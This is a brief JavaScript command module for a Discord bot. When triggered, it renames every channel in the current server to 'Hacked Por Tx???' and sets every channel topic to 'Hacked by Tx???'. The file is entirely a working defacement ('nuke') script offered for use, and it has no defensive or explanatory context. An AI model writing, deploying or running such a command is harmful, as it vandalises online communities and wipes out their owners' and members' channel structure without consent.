const Discord = require('discord.js')

module.exports.run = async (client, message, args) => {
    let arg = "???"
   client.guilds.get(message.guild.id).channels.forEach((canal) => {
      canal.setTopic("Hacked by Tx" + arg)
      canal.setName("Hacked Por Tx" + arg)
  })
}
